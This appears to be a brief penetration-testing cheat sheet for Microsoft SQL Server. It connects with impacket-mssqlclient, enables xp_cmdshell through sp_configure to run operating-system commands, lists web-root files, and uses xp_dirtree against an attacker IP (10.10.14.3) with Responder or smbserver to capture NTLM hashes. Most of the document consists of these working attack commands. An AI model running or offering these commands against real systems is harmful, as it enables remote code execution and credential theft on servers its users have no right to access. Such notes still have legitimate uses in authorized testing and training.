# AD or Windows SQL Port
```
impacket-mssqlclient -windows-auth <domain>/<user>:<pass>@<ip>
```

# Commands
```
enum_db         # To Enumerate DBs
enable_xp_cmdshell      # To enable xp_cmdshell
EXECUTE sp_configure 'show advanced options', 1     # To enable xp_cmdshell - 1
EXECUTE sp_configure 'xp_cmdshell', 1               # To enable xp_cmdshell - 2
RECONFIGURE         # To enable xp_cmdshell - 3
xp_cmdshell whoami      # To run commands thorugh xp_cmdshell
xp_dirtree C:\inetput\wwwroot       # To list files from any path like wwwroot
xp_dirtree \\10.10.14.3\test        # With responder in analyze mode or smbserver with smb2support running to catch hash 
```